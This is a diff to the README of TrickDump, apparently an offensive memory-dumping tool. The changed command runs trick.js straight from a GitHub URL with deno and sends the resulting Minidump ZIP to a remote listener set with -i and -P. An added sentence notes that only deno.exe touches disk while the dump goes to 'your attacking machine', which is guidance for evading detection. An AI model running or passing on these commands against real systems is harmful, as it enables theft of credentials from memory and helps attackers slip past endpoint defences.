@@ -66,11 +66,13 @@ deno run --allow-ffi --allow-write --allow-net https://raw.githubusercontent.com
 You can send the ZIP file to a remote machine instead of writing to disk using the *-i* and *-P* parameters:
 
 ```
-deno run --allow-ffi --allow-net trick.js -i 127.0.0.1 -P 4444
+deno run --allow-ffi --allow-net https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/trick.js -i 127.0.0.1 -P 4444
 ```
 
 ![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/trickdump/Screenshot_deno_5.png)
 
+
+If you check the previous screenshot, you will see only deno.exe (which is not malicious by itself) touches disk: the trick.js is retrieved from Github and the ZIP file with the Minidump is sent to your attacking machine.
 
 Either way, you get a ZIP file and you can create the Minidump file with the *create_dump.py* script using the *-t* flag:
 
